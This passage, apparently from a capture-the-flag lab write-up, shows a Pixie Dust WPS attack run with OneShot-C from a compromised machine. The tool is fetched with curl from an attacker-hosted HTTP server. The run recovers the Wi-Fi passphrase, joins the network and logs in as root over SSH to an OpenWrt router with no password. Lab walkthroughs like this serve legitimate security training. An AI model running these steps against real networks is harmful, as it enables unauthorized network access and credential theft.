</span></span></span><span class=line><span class=cl><span class=go>                 * Version2: 2.0
</span></span></span></code></pre></div><p>we have that <code>Config methods: Label, Display, Keypad</code> suggests that WPS is indeed active. So, in summary, WPS is enabled on the network with SSID <code>plcrouter</code>.</p><ul><li>Based on these findings, we can attempt a <code>Pixie Dust Attack</code> using <code>OneShot</code> (more specifically, it&rsquo;s version written in <code>C</code> from <a href=https://github.com/nikita-yfh/OneShot-C class=external-link target=_blank rel=noopener>this repository</a>). We clone it in our attacker machine, share a temporal <code>Python</code> <code>HTTP</code> server on port <code>8080</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ git clone https://github.com/nikita-yfh/OneShot-C.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;OneShot-C&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 32, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (32/32), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (32/32), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 32 (delta 17), reused 4 (delta 0), pack-reused 0
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (32/32), 19.20 KiB | 378.00 KiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (17/17), done.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cd OneShot-C
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Makefile  oneshot.c  README.md  vulnwsc.txt
</span></span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8000/) ...
</span></span></span></code></pre></div><p>and in the target machine just download it using <code>cURL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>root@attica01:/opt/PLC/OpenPLC_v3/webserver# curl -s http://10.10.16.2:8080/oneshot.c -o /tmp/oneshot.c
</span></span></span></code></pre></div><ul><li>We then build the <code>.c</code> file:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>root@attica01:/opt/PLC/OpenPLC_v3/webserver# cd /tmp
</span></span></span><span class=line><span class=cl><span class=go>root@attica01:/tmp# gcc oneshot.c -o oneshot
</span></span></span></code></pre></div><ul><li>Execute it, selecting <code>plcroute</code> option. We get then:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>root@attica01:/tmp# ./oneshot -i wlan0 -K
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] BSSID not specified (--bssid) ‚Äî scanning for available networks
</span></span></span><span class=line><span class=cl><span class=go>Network list:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>#</span>    BSSID              ESSID                     Sec.     PWR  WSC device name             WSC model
</span></span><span class=line><span class=cl><span class=go>1)   02:00:00:00:01:00  plcrouter                 WPA2     -30
</span></span></span><span class=line><span class=cl><span class=go>Select target (press Enter to refresh): 1
</span></span></span><span class=line><span class=cl><span class=go>[*] Running wpa_supplicant...
</span></span></span><span class=line><span class=cl><span class=go>[*] Trying pin 12345670...
</span></span></span><span class=line><span class=cl><span class=go>[*] Scanning...
</span></span></span><span class=line><span class=cl><span class=go>[*] Authenticating...
</span></span></span><span class=line><span class=cl><span class=go>[+] Authenticated
</span></span></span><span class=line><span class=cl><span class=go>[*] Associating with AP...
</span></span></span><span class=line><span class=cl><span class=go>[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
</span></span></span><span class=line><span class=cl><span class=go>[*] Received Identity Request
</span></span></span><span class=line><span class=cl><span class=go>[*] Sending Identity Response...
</span></span></span><span class=line><span class=cl><span class=go>[*] Received WPS Message M1
</span></span></span><span class=line><span class=cl><span class=go>[P] E-Nonce: 3179692a770db1f3c041063529e7d1c8
</span></span></span><span class=line><span class=cl><span class=go>[*] Building Message M2
</span></span></span><span class=line><span class=cl><span class=go>[P] PKR: 0722027bb27165c18bb3f32cfeddddc9dac30e910aae471749a212d3e096263c4ce1685fffbe5ae8894e33fc042b7f65e7718bffffe55e9662d849dbcbf65a704dfde008e52dccfa37af30e35a174981392e1101750e4f479e31ddd21fa0a5d71a6b77d0dbf071dbe489a87802e1fddb5999101f03bd3f7ef891f30ca5f27f054b270a1caf5f3de40e7274610ad44c032e1f7b6b348c9d7961b158081496e792fdd159c150c88cdde9d2722585d570e9f9c4d948696719676bf97e94b10dacdd
</span></span></span><span class=line><span class=cl><span class=go>[P] PKE: a7208b819389e5a8c99da2ac8f7e314be9e174b493b233f7328469bd9a657bd79f04ace5f6a87e5e87da72e99b19c715c466da2605efa5e80d4d43a7a6f30e7e8a656a3d4113f6ed2a9e3ad0b5c7addb57923f70a31d7d0d6d0fcaf43077b21f6cfb8b716bd036834057e6635a1207c9cc2c2daff8c4b10ea0150e1f6ac0fe92ee0b73893ca04f050a8d0a6bff55fb29c92434d1dd519b30f38336a980faa7a50884055260a2ea5b7d192e7f3bed2c112b7aadf679552cd8443541b23340b6c1
</span></span></span><span class=line><span class=cl><span class=go>[P] Authkey: 1f08524b0af2da914eb5426252442b7e2c93e33a35af41fc053b81854f464657
</span></span></span><span class=line><span class=cl><span class=go>[*] Received WPS Message M3
</span></span></span><span class=line><span class=cl><span class=go>[P] E-Hash1: ca3c4ae5e9d29ba95361c95a59004cf5b76d0dd78bfe1648b0fd03d51cef596e
</span></span></span><span class=line><span class=cl><span class=go>[P] E-Hash2: fa097374b2e3165ba269777ded8097e587bcd16751bad315d8d183968da562e5
</span></span></span><span class=line><span class=cl><span class=go>[*] Building Message M4
</span></span></span><span class=line><span class=cl><span class=go>[*] Received WPS Message M5
</span></span></span><span class=line><span class=cl><span class=go>[*] Building Message M6
</span></span></span><span class=line><span class=cl><span class=go>[*] Received WPS Message M7
</span></span></span><span class=line><span class=cl><span class=go>[+] WPS PIN: 12345670
</span></span></span><span class=line><span class=cl><span class=go>[+] WPA PSK: NoWWEDoKnowWhaTisReal123!
</span></span></span><span class=line><span class=cl><span class=go>[+] AP SSID: plcrouter
</span></span></span></code></pre></div><ul><li>Here <code>WPA PSK: NoWWEDoKnowWhaTisReal123!</code> and <code>AP SSID: plcrouter</code> are important things. We can use then the tool <code>wpa_passphrase</code> to save these credentials and generate a &ldquo;certificate&rdquo;. I note that <code>wpa_passphrase</code> is installed on the victim machine:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>root@attica03:/opt/PLC/OpenPLC_v3/webserver# which wpa_passphrase
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/usr/bin/wpa_passphrase
</span></span></span></code></pre></div><p>We then run on the target machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>root@attica03:/tmp# wpa_passphrase plcrouter &#39;NoWWEDoKnowWhaTisReal123!&#39; &gt; leaked
</span></span></span></code></pre></div><p>that generates a file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>root@attica03:/tmp# cat leaked
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>network={
</span></span></span><span class=line><span class=cl><span class=go>        ssid=&#34;plcrouter&#34;
</span></span></span><span class=line><span class=cl><span class=go>        #psk=&#34;NoWWEDoKnowWhaTisReal123!&#34;
</span></span></span><span class=line><span class=cl><span class=go>        psk=2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156
</span></span></span><span class=line><span class=cl><span class=go>}
</span></span></span></code></pre></div><ul><li>We then use the tool <code>wpa_supplicant</code> (which is also already installed on the victim machine):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>root@attica03:/tmp# wpa_supplicant -B -c leaked -i wlan0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Successfully initialized wpa_supplicant
</span></span></span><span class=line><span class=cl><span class=go>rfkill: Cannot open RFKILL control device
</span></span></span><span class=line><span class=cl><span class=go>rfkill: Cannot get wiphy information
</span></span></span></code></pre></div><ul><li>However, we still do not have an IP address in this net interface:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>root@attica03:/tmp# ip addr show wlan0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>7: wlan0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
</span></span></span><span class=line><span class=cl><span class=go>    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff
</span></span></span><span class=line><span class=cl><span class=go>    inet6 fe80::ff:fe00:400/64 scope link
</span></span></span><span class=line><span class=cl><span class=go>       valid_lft forever preferred_lft forever
</span></span></span></code></pre></div><p>so we assign one:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>root@attica03:/tmp# ifconfig wlan0 192.168.1.15 netmask 255.255.255.0
</span></span></span></code></pre></div><p>where I have assigned the IP address <code>192.168.1.15</code>. In this case I just selected <code>15</code> to assign to the target machine an address that I know is not occupied.</p><ul><li>Now I try to log in via <code>SSH</code> as <code>root</code> to the default IP address, which usually is <code>192.168.1.1</code> (just <code>1</code> instead of <code>15</code> in the last octetot of the IPv4 address):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>root@attica03:/tmp# ssh root@192.168.1.1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The authenticity of host &#39;192.168.1.1 (192.168.1.1)&#39; can&#39;t be established.
</span></span></span><span class=line><span class=cl><span class=go>ED25519 key fingerprint is SHA256:ZcoOrJ2dytSfHYNwN2vcg6OsZjATPopYMLPVYhczadM.
</span></span></span><span class=line><span class=cl><span class=go>This key is not known by any other names
</span></span></span><span class=line><span class=cl><span class=go>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class=line><span class=cl><span class=go>Warning: Permanently added &#39;192.168.1.1&#39; (ED25519) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  _______                     ________        __
</span></span></span><span class=line><span class=cl><span class=go> |       |.-----.-----.-----.|  |  |  |.----.|  |_
</span></span></span><span class=line><span class=cl><span class=go> |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
</span></span></span><span class=line><span class=cl><span class=go> |_______||   __|_____|__|__||________||__|  |____|
</span></span></span><span class=line><span class=cl><span class=go>          |__| W I R E L E S S   F R E E D O M
</span></span></span><span class=line><span class=cl><span class=go> -----------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go> OpenWrt 23.05.2, r23630-842932a63d
</span></span></span><span class=line><span class=cl><span class=go> -----------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go>=== WARNING! =====================================
</span></span></span><span class=line><span class=cl><span class=go>There is no root password defined on this device!
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;passwd&#34; command to set up a new password
</span></span></span><span class=line><span class=cl><span class=go>in order to prevent unauthorized SSH logins.
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go>root@ap:~# whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root
</span></span></span></code></pre></div><p>where we can get the <code>root</code> flag at <code>/root</code> directory.</p><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>